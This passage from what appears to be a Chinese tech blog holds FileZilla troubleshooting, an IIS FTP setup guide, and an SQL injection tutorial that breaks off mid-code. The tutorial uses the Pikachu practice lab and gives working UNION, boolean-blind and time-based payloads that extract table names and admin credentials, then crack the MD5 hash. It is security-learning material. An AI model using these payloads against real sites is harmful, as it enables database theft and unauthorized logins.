读取目录列表失败</code></pre><ul><li><p>解决办法：</p><p>更改<code>Filezilla</code>设置，编辑 → 设置 → 连接 → FTP-被动模式，将“<strong>使用服务器的外部ip地址来代替</strong>”改为“<strong>回到主动模式</strong>”即可。</p></li></ul><h2 id="0x02-连接超时"><a href="#0x02-连接超时" class="headerlink" title="0x02 连接超时"></a>0x02 连接超时</h2><ul><li><p>错误描述：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/打开文件夹时发生错误.png" alt="打开文件夹时发生错误"></center></li><li><p>解决办法：</p><p>将FileZillaServer的FTP服务设置为被动模式，并且需要设置相应的防火墙策略。（可以参考<a href="#setfirewall">设置防火墙策略</a>）</p></li></ul><h1 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h1><ul><li>2020-12-16：发现博文存在失误，重构并完善博文架构。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/iastro/article/details/31729859" target="_blank" rel="noopener">Filezilla—–服务器发回了不可路由的地址,使用服务器地址代替——-解决办法</a></li><li><a href="https://blog.csdn.net/hawht/article/details/82019325" target="_blank" rel="noopener">FileZilla，读取目录列表失败（425 Can‘t open data connection.）的解决办法</a></li><li><a href="https://jingyan.baidu.com/article/08b6a59179f84714a9092278.html" target="_blank" rel="noopener">425 Can’t open data connection for transfer</a></li><li><a href="https://www.cnblogs.com/masonblog/p/8668759.html" target="_blank" rel="noopener">Filezilla账号设置多个文件夹</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP服务器搭建（IIS）</title>
      <link href="/2020/09/07/ftp-fu-wu-qi-da-jian-iis/"/>
      <url>/2020/09/07/ftp-fu-wu-qi-da-jian-iis/</url>
      
        <content type="html"><![CDATA[<h1 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h1><p>​        FTP是用来在两台计算机之间传输文件，是Internet中应用非常广泛的服务之一。它可根据实际需要设置各用户的使用权限，同时还具有跨平台的特性，即在UNIX、Linux和Windows等操作系统中都可实现FTP客户端和服务器，相互之间可跨平台进行文件的传输。因此，FTP服务是网络中经常采用的资源共享方式之一。本问将介绍Windows下FTP服务器的搭建。</p><h1 id="FTP搭建"><a href="#FTP搭建" class="headerlink" title="FTP搭建"></a>FTP搭建</h1><p>​        Windows系统自带IIS可以使用IIS来搭建FTP服务器，但是IIS默认是不开启FTP功能的，需要用户手动开启。</p><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><ul><li>服务器：Windows Server 2012 R2 Standard</li><li>客户机：Windows 10</li></ul><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol><li><p>新版系统的IIS默认也是关闭的，所以我们需要先启用IIS服务。首先打开<code>服务器管理器</code>，显示界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/服务器管理其面板.png" alt="服务器管理其面板"></center></li><li><p>点击【添加角色和功能】选项，打开功能向导界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/添加角色和功能向导.png" alt="添加角色和功能向导"></center></li><li><p>点击【下一步】按钮，进入安装类型选择界面，默认为：<code>基于角色或基于功能的安装</code>，采用默认设置。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/安装类型选择.png" alt="安装类型选择"></center></li><li><p>点击【下一步】按钮，进入添加服务器选择界面，采用默认选项即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/服务器选择.png" alt="服务器选择"></center></li><li><p>点击【下一步】按钮，进入服务器角色选择界面，打开Web服务器（IIS）节点，勾选FTP服务器相关选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/服务器角色.png" alt="服务器角色"></center></li><li><p>点击【下一步】按钮，进入功能选择界面，勾选IIS可承载Web核心选项及其他相关选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/功能.png" alt="功能"></center></li><li><p>点击【下一步】按钮，进入确认界面，确认FTP相关依赖被安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/确认界面.png" alt="确认界面"></center></li><li><p>点击【安装】按钮即开始安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/安装过程.png" alt="安装过程"></center></li><li><p>IIS安装完成后，打开IIS管理器，显示界面如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/IIS界面.png" alt="IIS界面"></center></li><li><p>右键【网站】选择【添加FTP站点】选项，打开添加FTP站点界面。填写FTP站点名称并执行目录物理路径。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/添加FTP站点-站点信息.png" alt="添加FTP站点-站点信息"></center></li><li><p>点击【下一步】按钮，进入绑定和SSL设置界面。绑定IP地址，选定SSL证书。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/添加FTP站点-绑定和SSL设置.png" alt="添加FTP站点-绑定和SSL设置"></center></li><li><p>点击【下一步】按钮，进入身份验证和授权信息界面。指定授权信息及权限。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/添加FTP站点-身份认证和授权.png" alt="添加FTP站点-身份认证和授权"></center></li><li><p>点击【完成】按钮即可启用改FTP站点。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/启用FTP站点.png" alt="启用FTP站点"></center></li><li><p>点击新建的FTP站点，打开ftp-demo主页。点击FTP防火墙支持，添加外部IP（即：服务器的公网IP）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/FTP防火墙支持.png" alt="FTP防火墙支持"></center></li><li><p>为了实现权限分离，这里创建一个新的用户作为FTP的访问用户。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/FTP访问用户.png" alt="FTP访问用户"></center></li><li><p>设置新用户对FTP文件夹的访问权限。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/文件夹权限设置.png" alt="文件夹权限设置"></center></li><li><p>采用被动模式设置的IIS-FTP服务需要使用到50000-60000端口，所以需要配置安全组规则，否则无法完成目录读取操作。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/添加服务器安全组规则.png" alt="添加服务器安全组规则"></center></li><li><p>在客户端进行连接测试。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/IIS-FTPServer/客户端连接测试成功.png" alt="客户端连接测试成功"></center></li></ol><h1 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h1><h2 id="FTP模式分类"><a href="#FTP模式分类" class="headerlink" title="FTP模式分类"></a>FTP模式分类</h2><p>FTP服务器一般都支持主动和被动模式，连接采用何种模式是由FTP客户端软件决定。</p><p>主动 FTP ：<br>　　　　命令连接：客户端 &gt;1024 端口 → 服务器 21 端口<br>　　　　数据连接：客户端 &gt;1024 端口 ← 服务器 20 端口</p><p>被动 FTP ：<br>　　　　命令连接：客户端 &gt;1024 端口 → 服务器 21 端口<br>　　　　数据连接：客户端 &gt;1024 端口 ← 服务器 &gt;1024 端口</p><p>　　PORT（主动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。 当需要传送数据时， 客户端在命令链路上用PORT命令告诉服务器：“我打开了<code>***</code>X端口，你过来连接我”。于是服务器从20端口向客户端的<code>***</code>X端口发送连接请求，建立 一条数据链路来传送数据。 </p><p>　　PASV（被动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。 当需要传送数据时， 服务器在命令链路上用PASV命令告诉客户端：“我打开了<code>***</code>X端口，你过来连接我”。于是客户端向服务器的<code>***</code>X端口发送连接请求，建立一条数据链 路来传送数据。</p><p><strong>早先所有客户端都使用主动模式，而且工作的很好，而现在因为客户端防火墙的存在，将会关闭一些端口，这样主动模式将会失败。</strong>在这种情况下就要使用被动模式，但是一些端口也可能被服务器的防火墙封掉。不过因为ftp服务器需要它的ftp服务连接到一定数量的客户端，所以他们总是支持被动模式的。这就是我们为什么要使用被动模式的原意，为了确保数据可以正确的传输，<strong>使用 被动模式要明显优于主动模式。</strong></p><p>​        服务器上ftp用被动模式，服务器只开50000-60000的端口用于客户端访问，而看了下用1025-1034这样的端口并不行，用抓包也看到被动时，服务器端指定的端口是50492，大多是在5万-6万之间（这个是为什么，暂时没搞清）。<font color="red">依据这些信息说明FTP服务器需要开通50000-60000端口，因此需要修改服务器的安全组规则</font>。</p><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><p>​        FTP服务器设置的另一个问题就是权限的分配，出于安全的考虑我们不会采用匿名访问策略，随意我们需要有序设置FTP访问用户，以及改用户对FTP目录对应的操作权限等。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/peterYong/p/6596667.html" target="_blank" rel="noopener">在IIS上搭建FTP服务</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入笔记</title>
      <link href="/2020/09/07/sql-zhu-ru-bi-ji/"/>
      <url>/2020/09/07/sql-zhu-ru-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><p>&emsp;&emsp;一般情况下，程序开发者会使用动态SQL语句。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的SQL语句，这种创建SQL语句的方式具有很大的灵活性。但动态创建SQL语句时，需要特别注意注入的产生，例如下面的PHP代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select username,email from member where id=$id"</span><span class="token punctuation">;</span></code></pre><p>&emsp;&emsp;由于这里的的参数<code>id</code>可控，且带入数据库执行查询操作，所以非法用户可以拼接SQL语句对数据库进行恶意操作。例如当<code>id = -1 union select user(),database()#</code>时，在MySQL中执行的SQL语句如下：</p><pre class=" language-mysql"><code class="language-mysql">select username,email from member where id=-1 union select user(),database()#'</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入语句在MySQL中的直接结果.png" alt="注入语句在MySQL中的直接结果"></center><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>&emsp;&emsp;SQL注入漏洞的产生需要满足以下两个条件：</p><ul><li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li><li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li></ul><h1 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h1><ol><li><strong>注入点判断</strong>。不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造<font color="blue">我们需要的查询时必须要知道原SQL语句中的列数</font>，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显位置</strong>。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来，同样使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到这样的一个点。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><p>&emsp;&emsp;在进行SQL注入时，首先需要判断是否存在注入点，而其利用的原理是使<strong>SQL语句在执行时发生语法错误</strong>或<strong>SQL语句的执行结果为空使其代码逻辑发生错误</strong>，通常通过以下几种方式来判断是否存在注入点(<font color="blue">成功一定存在，不成功可能存在</font>)：</p><h2 id="单引号判断"><a href="#单引号判断" class="headerlink" title="单引号判断"></a>单引号判断</h2><p>&emsp;&emsp;单引号判断注入点是否存在利用的是SQL语句在执行时发生语法错误。在SQL语法中<code>&#39;</code>必须成对存在否则在语句执行时会报语法错误，语句不能正常执行。下图是MySQL中的执行情况。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号引起的报错(MySQL).png" alt="注入点判断-单引号引起的报错(MySQL)"></center><p>当<code>&#39;</code>从前端传入时，应用程序执行结果为：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号注入(Response错误).png" alt="注入点判断-单引号注入(Response错误)"></center><p>而正常输入参数时应答报文如下所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号(正常Response).png" alt="注入点判断-单引号(正常Response)"></center><p>根据返回的报文结果可知，该点存在SQL注入。</p><p>&emsp;&emsp;<font color="red">此种方式判断注入点最是简单，也是最通用的，其主要依赖于单引号(<code>&#39;</code>)，若单引号被程序过滤或转义则这种方式将毫无用武之地</font>。</p><h2 id="Bool判断"><a href="#Bool判断" class="headerlink" title="Bool判断"></a>Bool判断</h2><p>&emsp;&emsp;Bool判断注入点是否存在利用的是SQL语句的执行结果为空使其代码发生逻辑错误。SQL语句操作时常常用<code>where</code>条件来限定操作的记录，<code>where</code>条件恒真或恒假时，返回报文是不同的。</p><p>当<code>id=8 and 1=1</code>时，<code>where</code>条件恒真，返回页面如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Bool判断(Responnse正常).png" alt="注入点判断-Bool判断(Responnse正常)"></center><p>当<code>id=8 and 1=2</code>时，<code>where</code>条件恒假，返回页面如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Bool判断(Response错误).png" alt="注入点判断-Bool判断(Response错误)"></center><p>​        此种方式判断注入点依赖于where条件和SQL语句执行结果(0或1)，不同的执行结果将在前端展示不同效果，所以此方式<font color="red">适用于SQL执行结果有两种或多种展示的情况</font>(即使<code>&#39;</code>被过滤也不影响该判断方式)。但是若SQL的执行结果只有一种回显，则此法也将失效。</p><h2 id="Time判断"><a href="#Time判断" class="headerlink" title="Time判断"></a>Time判断</h2><p>​        Time判断注入点是否存在适用于SQL执行结果只有一种回显，但没有过滤<code>slee()</code>函数的情况，利用消息的返回时间判断是否存在注入点。正常消息的反应时间较短，而执行了<code>sleep()</code>函数后消息的反应时间相对较长。</p><p>当<code>id = 1</code>时，消息返回时间较短，具体数据如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Time判断(正常返回).png" alt="注入点判断-Time判断(正常返回)"></center><p>当<code>id = 1 and sleep(5)</code>时，消息的返回时间较长，与正常返回时间相差5秒左右。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Time判断(sleep).png" alt="注入点判断-Time判断(sleep)"></center><h1 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h1><p>​        <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong>。以<code>pikachu</code>平台的数据库为例，输入<code>select id，email from member where username=&#39;vince&#39; union select username,pw from member where id=1;</code>查询结果如下：</p><pre class=" language-mysql"><code class="language-mysql">+-------+----------------------------------+| id    | email                            |+-------+----------------------------------+| 1     | vince@pikachu.com                || vince | e10adc3949ba59abbe56e057f20f883e |+-------+----------------------------------+2 rows in set (0.00 sec)</code></pre><p>​        返回<code>pikachu</code>平台，在搜索型注入中，输入如下payload，出现如下报错。</p><p><code>v&#39; union select username,pw from member where id=1#%</code></p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/直接在浏览中使用union查询时出现错误.png"><p>​        出现上述报错的原因是<strong>union查询的字段不能超过主查询的字段数</strong>，这个时候可以在SQL语句后面加<strong><code>order by</code>子句</strong>，以此来判断主查询的字段数。</p><p><strong>使用<code>order by</code>子句来判断主查询中字段的个数</strong>：</p><ul><li>输入<code>v&#39; order by 4#%</code>，反馈如下图所示：</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入使用orderby子句判断主查询字段数.png"><ul><li>输入<code>v&#39; order by 3#%</code>，反馈如下图所示：</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入使用orderby主句判断主查询字段个数2.png"><ul><li>由以上操作判断出<strong>主查询有三个字段</strong>。</li></ul><p><strong>使用<code>union select</code>联合查询获取数据库指纹信息</strong>：</p><ul><li>之后我们来使用<code>union</code>来做一个SQL语句的拼接。构造payload：<code>v&#39; union select database(),user(),version()#%</code>，反馈结果如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入查询数据库名称用户名版本信息.png"><ul><li>由上述操作我们得知数据库的版本是<code>5.5.53&gt;5.0</code>存在<code>information_schema</code>数据库。</li></ul><p><strong>union select联合查询结合<code>information_schema</code>查询网站所有库名</strong>:</p><ul><li>构造payload:<code>v&#39;union select table_schema,2,3 from information_schema.tables -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入获取所有库名称.png" alt="union注入获取所有库名称"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的数据表</strong>:-</p><ul><li>构造payload：<code>v&#39;union select (select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-查询pikachu库中的表名.png" alt="union注入-查询pikachu库中的表名"></center><ul><li>此条payload使用<code>limit</code>将查询结果限制为一条，可以通过修改<code>limit</code>的参数来回显出用户数据表名。如：<code>v&#39;union select (select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-查询pikachu库的user表.png" alt="union注入-查询pikachu库的user表"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的<code>users</code>数据表的字段名</strong>:</p><ul><li>构造payload：<code>v&#39;union select (select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表字段查询.png" alt="union注入-pikachu库users表字段查询"></center><ul><li>此条payload使用<code>limit</code>将查询结果限制为一条，可以通过修改<code>limit</code>的参数来回显出用户名、密码等敏感信息。如：<code>v&#39;union select (select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 1,1),(select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 2,1),3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表username和password.png" alt="union注入-pikachu库users表username和password"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的<code>users</code>数据表中<code>username</code>和<code>password</code>的值</strong>:</p><ul><li>构造payload：<code>v&#39;union select username,password,3 from users limit 0,1 -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表username和password字段值.png" alt="union注入-pikachu库users表username和password字段值"></center><p><strong>尝试爆破MD5</strong>:</p><ul><li>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center><h1 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h1><p>​        当系统不显示返回信息或当发生错误时将系统重定向到一个通用错误页面，这个上述使用过的SQL注入办法不能再使用。</p><p>​        盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，这就需要我们使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><p>​        <strong>SQL盲注分为三大类</strong>：基于布尔型SQL盲注、基于时间型SQL盲注、基于报错型SQL盲注</p><p><strong>实战测试</strong>：    </p><ol><li><p><strong>爆数据库名称长度</strong></p><p>在检测数据库名称长度时，因为错误回显信息被屏蔽，但其发生错误时还是会有明显得特征，因此使用<code>length()</code>结合逻辑运算来判断数据库名称的长度值。</p><p>payload：<code>vince&#39; and length(database()) &lt; 3#</code>，其中<code>3</code>要不断变化以此来逼近数据库名称长度值。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/Boolean盲注爆数据库名称长度.png"><p>解析：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png"><p>拼接SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库名称长度select id,email from member where username='vince' and length(database()) < 3#'</code></pre></li></ol><ol start="2"><li><p><strong>爆数据库名称</strong>（<font color="blue">一个字母一个字母得爆</font>）</p><p>获取数据库名称长度后，使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数来逐个字母判断数据库的名称，可构造payload：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr(database(),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr(database(),1,1))=112#</code></pre><p>操作结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注爆数据库名称.png"><p>以此类推继续爆数据库名称为：<code>pikachu</code>。</p><p><strong>解析</strong>：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png"><p>拼接SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库名称select id,email from member where username='vince' and ascii(substr(database(),1,1))=112#'</code></pre></li><li><p><strong>爆数据表名称</strong></p><p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112#vince' and ord(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表名称首字母h.png" alt="Boolean注入-爆数据表名称首字母h"></center><p>以此类推爆破得到表名为：<code>httpinfo</code>，不是我们想要的数据表，因此需要修改<code>limit</code>参数继续爆破表名。最后在<code>limit 3 1</code>处爆破得到<code>users</code>表。</p></li><li><p><strong>爆users表字段名称</strong></p><p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112#vince' and ord(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表字段名称.png" alt="Boolean注入-爆数据表字段名称"></center><p>以此类推爆破得到字段名为：<code>id</code>，不是我们在意的数据，因此需要修改<code>limit</code>参数继续爆破字段名。最后在<code>limit 1 1</code>处爆破得到<code>username</code>字段名，在<code>limit 2 1</code>处爆破得到<code>password</code>字段名。</p></li><li><p><strong>爆users表字段值</strong></p><p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select username from users limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select username from users limit 0,1),1,1))=112#vince' and ord(substr((select username from users limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆admin用户名.png" alt="Boolean注入-爆admin用户名"></center><p>以此类推爆破得到用户名为：<code>admin</code>，修改<code>username</code>为<code>password</code>继续爆破得到密码为：<code>e10adc3949ba59abbe56e057f20f883e</code></p></li><li><p><strong>尝试爆破MD5</strong>:</p><p>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center></li><li><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center></li></ol><h1 id="Time注入"><a href="#Time注入" class="headerlink" title="Time注入"></a>Time注入</h1><p>​    在某些地方进行<code>boolean</code>盲注失败后，可以使用基于时间的盲注继续进行注入点测试。基于时间的注入会使用到<code>sleep()</code>函数。</p><p>​        在pikachu中的基于时间盲注模块使用payload：<code>vince&#39; and sleep(10)#</code>，进行检测结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间的注入操作.png"><ol><li><p><strong>爆数据库名称</strong></p><p>输入：<code>vince&#39; and if(substr(database(),1,1)=&#39;p&#39;,sleep(10),null)#</code>，反馈结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间盲注爆数据库名称.png"><p><strong>解析</strong>：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间盲注解析.png"><p>拼接的SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 检测注入点是否存在select id,email from member where username='vince' and sleep(5)#'# 爆数据库名称select id,email from member where username='vince' and 